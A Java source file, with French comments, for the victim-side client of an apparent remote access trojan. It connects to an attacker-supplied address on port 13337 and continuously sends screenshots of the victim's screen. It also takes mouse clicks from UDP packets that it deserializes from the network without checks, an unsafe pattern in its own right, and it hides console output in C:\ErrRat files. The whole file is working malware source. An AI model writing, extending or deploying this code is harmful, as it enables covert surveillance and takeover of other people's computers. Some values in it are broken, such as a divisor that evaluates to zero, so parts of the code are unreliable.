package client;

import java.awt.AWTException;
import java.awt.Graphics2D;
import java.awt.HeadlessException;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;

import common.MouseAction;


public class ClientExe {
	/* Si l'URI du dossier des ressources contient un espace, le ClassLoader va le remplacer par %20. Donc, pour que ça soit compréhensible par Windows, on fait un replaceAll. */
	private final static String ressourcesDirectory = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath()).getAbsolutePath().replaceAll("%20", " ") + "\\ressources\\"+File.separator;


	
	/* Réseau */
	private static String adresseHacker;
	private static final int portServeur = 13337;
	private InetSocketAddress adrDest = new InetSocketAddress(adresseHacker, portServeur);

	private int clientResolutionHeight;
	private int clientResolutionWidth;
	
	private static int frameClientWidth; 
	private static int frameClientHeight;


	private final float diviseurResolution = (2/3);
	
	private static Socket socketClient;
	private DatagramSocket socketRat;
	private Robot bot;
	
	
	
	public static void main (String args[]) throws InterruptedException, IOException, AWTException {
		if (args.length > 0) { System.out.println( "Argument : " + args[0] ); setAdressehacker(args[0]);}
		System.out.println("IP : "+getAdressehacker() + " et ressourcesDirectory : "+ressourcesDirectory);
		System.out.println("ClassLoader : "+new File(ClassLoader.getSystemClassLoader().getResource(".").getPath()).getAbsolutePath());
		ClientExe c = new ClientExe();
		c.init();
		c.FullScreenCaptureResized(frameClientWidth, frameClientHeight);
		c.startRatThread();
		
	}
	

	
	public void FullScreenCaptureResized(int width, int height) throws IOException, AWTException {
		
		/***********************************************************************/
		new Thread(new Runnable() {
		     public void run() {
		       try {
		    	   while(true) {
		    		   if (socketClient.isClosed()) {
		    			   System.exit(0);
		    		   }
		   				Thread.sleep(100);
			    	   	int mX = (int)MouseInfo.getPointerInfo().getLocation().getX();
			    	   	int mY = (int)MouseInfo.getPointerInfo().getLocation().getY();
			    	   	
			            /* Prends une screen et rajoute l'image du curseur par dessus */
			            Rectangle screenRec = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());  
			            BufferedImage bi = new Robot().createScreenCapture(screenRec);
			            BufferedImage cursor = ImageIO.read(new File(ressourcesDirectory + "cursor.gif"));
			            bi.getGraphics().drawImage(cursor, mX, mY, null);
			            
			            /* On resize l'image */
			            ImageIcon nativeScreen = new ImageIcon(bi);
			            java.awt.Image imgResized = nativeScreen.getImage().getScaledInstance(1280, 720, java.awt.Image.SCALE_SMOOTH);
			            BufferedImage BUFF = new BufferedImage(imgResized.getWidth(null), imgResized.getHeight(null), BufferedImage.TYPE_INT_ARGB);
		
			            /* On "dessine" l'image sur le Graphics2D */
			            Graphics2D bGr = BUFF.createGraphics();
			            bGr.drawImage(imgResized, 0, 0, null);
			            bGr.dispose();
		
			            
			            /* On copie l'image dans un tableau de byte[] */
			            ByteArrayOutputStream baos = new ByteArrayOutputStream();
			            ImageIO.write(BUFF, "gif", baos);
			    //System.out.println("-82-");
			            /* On envoit ScreenSize= pour spécifier au serveur qu'on va lui envoyer une screenshot */
			            envoyer("ScreenSize=" + baos.size());
			            envoyer( baos.toByteArray() );
			            baos.close();
		    	   }
		       }
		       catch (AWTException | IOException | InterruptedException ex) { ex.getStackTrace();}
		     }
		}).start();
		/***********************************************************************/

	}
	
	
	/*
	 * Global Initialization
	 */
	private void init() throws HeadlessException, IOException, AWTException {
		bot = new Robot();
		initSocket();
		NetworkgetSystemProperties();
	}
	
	/*
	 * Initialization of sockets & network stuff
	 */
	private void initSocket() throws IOException {
		System.setErr(new PrintStream(new FileOutputStream("C:\\ErrRat\\error.txt")));
		System.setOut(new PrintStream(new FileOutputStream("C:\\ErrRat\\output.txt")));
		
		socketClient = new Socket();
		socketClient.connect(adrDest);
		
		socketRat = new DatagramSocket(null);
		socketRat.bind(new InetSocketAddress(54322));
	}
	
	
	/*
	 * Get some system parameters
	 */
	public void NetworkgetSystemProperties() throws HeadlessException, IOException {
		clientResolutionWidth = (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		clientResolutionHeight = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
		
		//frameClientWidth = clientResolutionWidth * (diviseurResolution );
		//frameClientHeight = clientResolutionHeight * (diviseurResolution);
		
		envoyer("Resolution=" +(int) Toolkit.getDefaultToolkit().getScreenSize().getWidth()+ ":"+(int) Toolkit.getDefaultToolkit().getScreenSize().getHeight());
	}

			
	/*
	 * Send String
	 */
	public void envoyer(String msg) throws IOException {
		byte[] bufE = msg.getBytes();
		OutputStream os = socketClient.getOutputStream();
		os.write(bufE);
		return;
	}
	
	
	/*
	 * Send Byte[]
	 */
	public void envoyer(byte[] msg) throws IOException {
		OutputStream os = socketClient.getOutputStream();
		os.write(msg);
		return;
	}

	
	
	/*
	 * When the HackerExe writes commands to execute, the following function
	 * sends the commands to the Telecommande (running on the client computer)
	 */
	protected void sendToTelecommande(String msg) throws IOException {
		DatagramSocket socket_send = new DatagramSocket(null);
		 byte[] bufR = new byte[2048];
		 DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
		 bufR = new String(msg).getBytes();
		 
		 /* Attention, on envoit bien la commande à l'hôte qui execute ClientExe (ce programme)
		 * Donc c'est bien 127.0.0.1:54321 */
		 dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress("127.0.0.1", 54321));
		 socket_send.send(dpR);		
	}

	
	/* Méthode pour que le RAT puisse recevoir un objet */
	private void startRatThread() {
		
		new Thread(new Runnable() {
			@Override 
			public void run() {
				while (true) {
					if (socketClient.isClosed()) {
		    			 System.exit(0);
		    		}
					System.out.println("RAT is waiting...");
					byte[] bufR = new byte[2048];
					DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);			
					
					try {
					socketRat.receive(dpR); System.out.println("after REceived");} 
					catch (IOException e) { e.printStackTrace(); }
					
					String recu = new String(bufR, dpR.getOffset(), dpR.getLength());
					System.out.println("recu = "+recu);
					if (recu.matches(".*down socket.*")) {
						try {
							socketClient.close();
							socketRat.close();
						} 
						catch (IOException e) { e.printStackTrace(); }
						finally { System.exit(0); }
					}
					
					ByteArrayInputStream bis = new ByteArrayInputStream(bufR);
					ObjectInput in = null;
					try {
					  in = new ObjectInputStream(bis);
					  MouseAction o = (MouseAction) in.readObject(); 
					  int x = Math.round( o.getCoordX() );
					 int  y = Math.round( o.getCoordY() );
					  System.out.println(" x : "+x+" y : "+y);
					  bot.mouseMove(x, y);
					  bot.mousePress(InputEvent.BUTTON1_MASK);
					  bot.mouseRelease(InputEvent.BUTTON1_MASK);
					}
					catch (IOException | ClassNotFoundException e) {e.printStackTrace();} 
					finally {
						try { if (in != null) in.close(); } 
						catch (IOException ex) { }
					}
				}
				
			}
		}).start();	
	}
	

	public static void setAdressehacker(String adr) { adresseHacker = adr; }
	public static String getAdressehacker() { return adresseHacker; }

}
